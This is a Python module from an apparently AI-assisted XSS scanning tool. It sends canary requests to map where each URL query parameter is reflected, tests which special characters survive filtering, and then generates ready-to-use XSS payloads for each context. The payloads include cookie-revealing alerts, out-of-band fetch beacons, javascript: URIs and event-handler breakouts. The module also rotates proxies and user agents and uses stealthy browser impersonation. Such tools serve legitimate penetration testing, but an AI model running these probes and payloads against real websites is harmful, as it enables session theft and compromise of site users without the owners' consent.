"""Active parameter reflection prober for XSS surface mapping.

For each URL query parameter, sends two requests:
  1. Reflection probe  — a canary string to map where input appears in the response.
  2. Character probe   — canary + XSS-relevant chars to learn which survive filters.

Results are returned as ProbeResult objects that enrich the ParsedContext passed
to the AI generator, so payloads are targeted to confirmed contexts.
"""
from __future__ import annotations

import os
import re
import secrets
import time
from dataclasses import dataclass, field
from itertools import cycle
from pathlib import Path
from typing import Any, Callable
from urllib.parse import quote as url_quote

from scrapling.fetchers import FetcherSession

from ai_xss_generator.types import DomSink, ParsedContext, PayloadCandidate


# XSS-critical characters to test for survival after server processing
PROBE_CHARS = '<>"\';\\/`(){}'

# Sentinel strings that bracket the probe chars in the request value
_PROBE_OPEN = "AXSSOP"
_PROBE_CLOSE = "AXSSCL"


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------


@dataclass(slots=True)
class ReflectionContext:
    """A single location where a probed parameter was reflected."""

    context_type: str
    """One of: js_string_dq | js_string_sq | js_string_bt | js_code |
    html_attr_event | html_attr_url | html_attr_value |
    html_body | html_comment | json_value"""

    attr_name: str = ""
    """Attribute name for html_attr_* contexts (e.g. 'href', 'onclick')."""

    surviving_chars: frozenset[str] = field(default_factory=frozenset)
    """Probe chars that came back literally unmodified in the response."""

    snippet: str = ""
    """Short excerpt of surrounding HTML for reference."""

    @property
    def is_exploitable(self) -> bool:
        """True if surviving chars indicate at least one XSS technique can work."""
        ct = self.context_type
        sc = self.surviving_chars
        if ct == "js_string_dq":
            return '"' in sc or ";" in sc
        if ct == "js_string_sq":
            return "'" in sc or ";" in sc
        if ct == "js_string_bt":
            return "`" in sc or ";" in sc
        if ct == "js_code":
            return bool(sc)
        if ct == "html_attr_event":
            return True  # already in JS — no breakout needed
        if ct == "html_attr_url":
            return True  # javascript: URI still works regardless of other chars
        if ct == "html_attr_value":
            return '"' in sc or "'" in sc
        if ct == "html_body":
            return "<" in sc
        if ct == "html_comment":
            return "-" in sc or "<" in sc
        if ct == "json_value":
            return '"' in sc
        return bool(sc)

    @property
    def short_label(self) -> str:
        return self.context_type + (f"({self.attr_name})" if self.attr_name else "")


@dataclass(slots=True)
class ProbeResult:
    """Probe results for a single URL parameter."""

    param_name: str
    original_value: str
    reflections: list[ReflectionContext] = field(default_factory=list)
    error: str | None = None

    @property
    def is_reflected(self) -> bool:
        return bool(self.reflections)

    @property
    def is_injectable(self) -> bool:
        return any(ctx.is_exploitable for ctx in self.reflections)

    def to_sinks(self) -> list[DomSink]:
        """Convert probe results to DomSink entries for context enrichment."""
        sinks = []
        for ctx in self.reflections:
            sink_name = f"probe:{ctx.context_type}"
            if ctx.attr_name:
                sink_name += f":{ctx.attr_name}"
            chars_note = (
                f" surviving={sorted(ctx.surviving_chars)!r}" if ctx.surviving_chars else ""
            )
            sinks.append(
                DomSink(
                    sink=sink_name,
                    source=(
                        f"param={self.param_name!r} confirmed via active probe"
                        f" → {ctx.short_label}{chars_note}"
                    ),
                    location=f"active_probe:param:{self.param_name}",
                    confidence=0.99 if ctx.is_exploitable else 0.88,
                )
            )
        return sinks


# ---------------------------------------------------------------------------
# Context classification
# ---------------------------------------------------------------------------


def _make_canary() -> str:
    return "axss" + secrets.token_hex(4)


def _classify_context_at(html: str, idx: int, canary: str) -> ReflectionContext | None:
    """Determine the XSS injection context at *idx* in *html*."""
    snippet_start = max(0, idx - 300)
    snippet_end = min(len(html), idx + len(canary) + 100)
    snippet = html[snippet_start:snippet_end]
    before = html[:idx]

    # 1. HTML comment?
    copen = before.rfind("<!--")
    cclose = before.rfind("-->")
    if copen != -1 and (cclose == -1 or cclose < copen):
        return ReflectionContext(context_type="html_comment", snippet=snippet)

    # 2. Inside a <script> block?
    script_open_pos = before.rfind("<script")
    script_close_pos = before.rfind("</script")
    in_script = script_open_pos != -1 and (
        script_close_pos == -1 or script_close_pos < script_open_pos
    )
    if in_script:
        tag_end = html.find(">", script_open_pos)
        content_before = html[tag_end + 1 : idx] if tag_end != -1 else before
        for quote_char, ctx_type in [
            ('"', "js_string_dq"),
            ("'", "js_string_sq"),
            ("`", "js_string_bt"),
        ]:
            count = 0
            i = 0
            while i < len(content_before):
                ch = content_before[i]
                if ch == "\\" and i + 1 < len(content_before):
                    i += 2
                    continue
                if ch == quote_char:
                    count += 1
                i += 1
            if count % 2 == 1:
                return ReflectionContext(context_type=ctx_type, snippet=snippet)
        return ReflectionContext(context_type="js_code", snippet=snippet)

    # 3. Inside an HTML attribute?
    last_tag_open = before.rfind("<")
    last_tag_close = before.rfind(">")
    if last_tag_open != -1 and last_tag_open > last_tag_close:
        tag_content = before[last_tag_open:]
        attr_m = re.search(r"""([\w:-]+)\s*=\s*["']?[^"'<>]*$""", tag_content)
        if attr_m:
            attr_name = attr_m.group(1).lower()
            if attr_name.startswith("on"):
                return ReflectionContext(
                    context_type="html_attr_event", attr_name=attr_name, snippet=snippet
                )
            if attr_name in (
                "href", "src", "action", "formaction", "data", "xlink:href", "content",
            ):
                return ReflectionContext(
                    context_type="html_attr_url", attr_name=attr_name, snippet=snippet
                )
            return ReflectionContext(
                context_type="html_attr_value", attr_name=attr_name, snippet=snippet
            )

    # 4. JSON value heuristic
    stripped_before = before.rstrip()
    if stripped_before.endswith(('": "', "': '", '":"', "':'")):
        return ReflectionContext(context_type="json_value", snippet=snippet)

    # 5. Raw HTML body (fallback)
    return ReflectionContext(context_type="html_body", snippet=snippet)


def _find_reflections(html: str, canary: str) -> list[ReflectionContext]:
    """Find all positions of *canary* in *html* and classify each injection context."""
    contexts: list[ReflectionContext] = []
    seen: set[str] = set()
    pos = 0
    while True:
        idx = html.find(canary, pos)
        if idx == -1:
            break
        pos = idx + 1
        ctx = _classify_context_at(html, idx, canary)
        if ctx and ctx.context_type not in seen:
            contexts.append(ctx)
            seen.add(ctx.context_type)
    return contexts


def _analyze_char_survival(html: str, canary: str) -> frozenset[str]:
    """Return the set of probe chars that appeared unmodified in the response."""
    open_marker = canary + _PROBE_OPEN
    pos = html.find(open_marker)
    if pos == -1:
        return frozenset()
    start = pos + len(open_marker)
    end_pos = html.find(_PROBE_CLOSE, start)
    section = html[start:end_pos] if end_pos != -1 else html[start : start + len(PROBE_CHARS) + 30]
    return frozenset(ch for ch in PROBE_CHARS if ch in section)


# ---------------------------------------------------------------------------
# Payload generation for confirmed probe results
# ---------------------------------------------------------------------------


def payloads_for_probe_result(result: ProbeResult) -> list[PayloadCandidate]:
    """Generate targeted, directly-usable payloads for a confirmed probe reflection.

    Unlike the heuristic generator in payloads.py, these are unencoded and
    tied to the exact parameter and context observed during active probing.
    The ``test_vector`` field shows the exact ``?param=value`` to use.
    """
    payloads: list[PayloadCandidate] = []

    for ctx in result.reflections:
        sc = ctx.surviving_chars
        ct = ctx.context_type

        def _p(raw: str, title: str, risk: int = 90) -> PayloadCandidate:
            return PayloadCandidate(
                payload=raw,
                title=f"{title} [{result.param_name}]",
                explanation=(
                    f"Active probe confirmed: '{result.param_name}' → {ctx.short_label}. "
                    + (f"Surviving chars: {''.join(sorted(sc))!r}." if sc else "")
                ),
                test_vector=f"?{result.param_name}={url_quote(raw, safe='')}",
                tags=["probe-confirmed", ct, f"param:{result.param_name}"],
                target_sink=f"probe:{ct}",
                risk_score=risk,
            )

        if ct == "js_string_dq" and ('"' in sc or ";" in sc):
            payloads += [
                _p('";alert(document.domain)//', "Double-quote JS breakout → domain alert", 96),
                _p('";alert(document.cookie)//', "Double-quote JS breakout → cookie exfil", 94),
                _p('"+alert(document.domain)+"', "Double-quote in-string concat", 88),
                _p('";fetch("//"+document.domain)//', "Double-quote → OOB beacon", 87),
            ]

        elif ct == "js_string_sq" and ("'" in sc or ";" in sc):
            payloads += [
                _p("';alert(document.domain)//", "Single-quote JS breakout → domain alert", 96),
                _p("';alert(document.cookie)//", "Single-quote JS breakout → cookie exfil", 94),
            ]

        elif ct == "js_string_bt" and ("`" in sc or ";" in sc):
            payloads += [
                _p("`; alert(document.domain)//", "Backtick JS breakout → alert", 90),
                _p("`${alert(document.domain)}`", "Backtick template expression", 88),
            ]

        elif ct == "js_code":
            payloads += [
                _p("alert(document.domain)//", "Direct JS code injection", 97),
                _p(";alert(document.cookie)//", "Semicolon-prefixed JS injection", 94),
                _p("(function(){alert(document.domain)})()", "IIFE injection", 90),
            ]

        elif ct == "html_attr_event":
            payloads += [
                _p("alert(document.domain)", "Direct event handler payload", 99),
                _p("alert(document.cookie)", "Event handler → cookie exfil", 97),
                _p("fetch('//'+document.domain)", "Event handler → OOB beacon", 91),
            ]

        elif ct == "html_attr_url":
            payloads += [
                _p("javascript:alert(document.domain)", "JavaScript URI injection", 96),
                _p("javascript:alert(document.cookie)", "JavaScript URI → cookie exfil", 94),
                _p("data:text/html,<script>alert(document.domain)</script>", "Data URI HTML embed", 89),
            ]

        elif ct == "html_attr_value":
            if '"' in sc:
                payloads += [
                    _p('" onmouseover="alert(document.domain)', 'Attr escape (") → onmouseover', 94),
                    _p('" onfocus="alert(document.domain)" autofocus="', 'Attr escape (") → autofocus', 92),
                ]
            if "'" in sc:
                payloads.append(
                    _p("' onmouseover='alert(document.domain)", "Attr escape (') → onmouseover", 94)
                )

        elif ct == "html_body" and "<" in sc:
            payloads += [
                _p("<img src=x onerror=alert(document.domain)>", "HTML injection → img onerror", 96),
                _p("<svg onload=alert(document.domain)>", "HTML injection → SVG onload", 94),
                _p("<details open ontoggle=alert(document.domain)>", "HTML injection → details ontoggle", 89),
                _p("<script>alert(document.domain)</script>", "HTML injection → script tag", 91),
            ]

        elif ct == "html_comment":
            if "-" in sc:
                payloads.append(
                    _p("--><img src=x onerror=alert(document.domain)><!--", "Comment breakout → onerror", 91)
                )
            if "<" in sc and "-" not in sc:
                payloads.append(
                    _p("<img src=x onerror=alert(document.domain)>", "Comment → HTML injection", 88)
                )

        elif ct == "json_value" and '"' in sc:
            payloads += [
                _p('</script><script>alert(document.domain)</script>', "JSON → script injection", 89),
                _p('","xss":"<img src=x onerror=alert(1)>', "JSON structure break → HTML", 86),
            ]

    return payloads


# ---------------------------------------------------------------------------
# Probe session
# ---------------------------------------------------------------------------


def _resp_html(resp: Any) -> str:
    """Extract HTML text from a Scrapling response. Falls back to raw body bytes."""
    text = resp.text
    if text:
        return text
    body = getattr(resp, "body", None)
    if body:
        return body.decode("utf-8", errors="replace") if isinstance(body, bytes) else str(body)
    return ""


def _load_rotation_values(raw_value: str | None) -> list[str]:
    if not raw_value:
        return []
    path = Path(raw_value)
    values = (
        path.read_text(encoding="utf-8").splitlines()
        if path.exists()
        else raw_value.split(",")
    )
    return [v.strip() for v in values if v.strip()]


def _rebuild_url(url: str, params: dict[str, str]) -> str:
    """Return *url* with query string replaced by *params*."""
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(params))
    )


def _probe_param(
    session: Any,
    url: str,
    param_name: str,
    original_value: str,
    all_params: dict[str, str],
    *,
    canary: str,
    delay: float,
    ua_cycle: Any,
    proxy_cycle: Any | None,
) -> ProbeResult:
    """Send two probe requests for one parameter and return a ProbeResult."""
    req_kwargs: dict[str, Any] = {"headers": {"User-Agent": next(ua_cycle)}}
    if proxy_cycle:
        req_kwargs["proxy"] = next(proxy_cycle)

    # Phase 1 — reflection mapping
    if delay > 0:
        time.sleep(delay)
    try:
        resp1 = session.get(_rebuild_url(url, {**all_params, param_name: canary}), **req_kwargs)
    except Exception as exc:
        return ProbeResult(param_name=param_name, original_value=original_value, error=str(exc))

    reflections = _find_reflections(_resp_html(resp1), canary)
    if not reflections:
        return ProbeResult(param_name=param_name, original_value=original_value)

    # Phase 2 — character survival
    char_probe = canary + _PROBE_OPEN + PROBE_CHARS + _PROBE_CLOSE
    if delay > 0:
        time.sleep(delay)
    try:
        resp2 = session.get(
            _rebuild_url(url, {**all_params, param_name: char_probe}), **req_kwargs
        )
        surviving = _analyze_char_survival(_resp_html(resp2), canary)
    except Exception:
        surviving = frozenset()

    return ProbeResult(
        param_name=param_name,
        original_value=original_value,
        reflections=[
            ReflectionContext(
                context_type=ctx.context_type,
                attr_name=ctx.attr_name,
                surviving_chars=surviving,
                snippet=ctx.snippet,
            )
            for ctx in reflections
        ],
    )


def probe_url(
    url: str,
    *,
    rate: float = 25.0,
    on_result: Callable[[ProbeResult], None] | None = None,
) -> list[ProbeResult]:
    """Probe all query parameters of *url* for XSS reflection contexts.

    Sends two requests per parameter:
    1. Canary reflection probe → maps where input lands in the response.
    2. Character survival probe → determines which XSS chars survive filters.

    Args:
        url:       Target URL with query parameters to test.
        rate:      Max requests per second (0 = uncapped). Shared with ``--rate``.
        on_result: Callback fired after each parameter finishes probing.
    """
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    raw_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not raw_params:
        return []

    flat_params = {k: v[0] for k, v in raw_params.items()}
    delay = (1.0 / rate) if rate > 0 else 0
    canary = _make_canary()

    ua_list = _load_rotation_values(os.environ.get("AXSS_USER_AGENTS")) or [
        "axss/0.1 (+authorized security testing; scrapling)"
    ]
    proxies_list = _load_rotation_values(os.environ.get("AXSS_PROXIES")) or []
    ua_cycle = cycle(ua_list)
    proxy_cycle = cycle(proxies_list) if proxies_list else None

    results: list[ProbeResult] = []
    with FetcherSession(
        impersonate="chrome",
        stealthy_headers=True,
        timeout=20,
        follow_redirects=True,
        retries=1,
    ) as session:
        for param_name, original_value in flat_params.items():
            result = _probe_param(
                session, url, param_name, original_value, flat_params,
                canary=canary, delay=delay, ua_cycle=ua_cycle, proxy_cycle=proxy_cycle,
            )
            results.append(result)
            if on_result:
                on_result(result)

    return results


def enrich_context(context: ParsedContext, probe_results: list[ProbeResult]) -> ParsedContext:
    """Merge active probe results into *context*, prepending confirmed sinks and notes."""
    from dataclasses import replace as dc_replace

    extra_sinks: list[DomSink] = []
    extra_notes: list[str] = []

    for result in probe_results:
        if result.error:
            extra_notes.append(
                f"[probe] '{result.param_name}': request error — {result.error}"
            )
            continue
        if not result.is_reflected:
            extra_notes.append(f"[probe] '{result.param_name}': not reflected.")
            continue

        extra_sinks.extend(result.to_sinks())
        for ctx in result.reflections:
            chars_str = "".join(sorted(ctx.surviving_chars)) if ctx.surviving_chars else "?"
            status = "INJECTABLE" if ctx.is_exploitable else "chars filtered"
            extra_notes.append(
                f"[probe:CONFIRMED] '{result.param_name}' → {ctx.short_label} "
                f"surviving={chars_str!r} [{status}]"
            )

    return dc_replace(
        context,
        dom_sinks=extra_sinks + context.dom_sinks,
        notes=extra_notes + context.notes,
    )
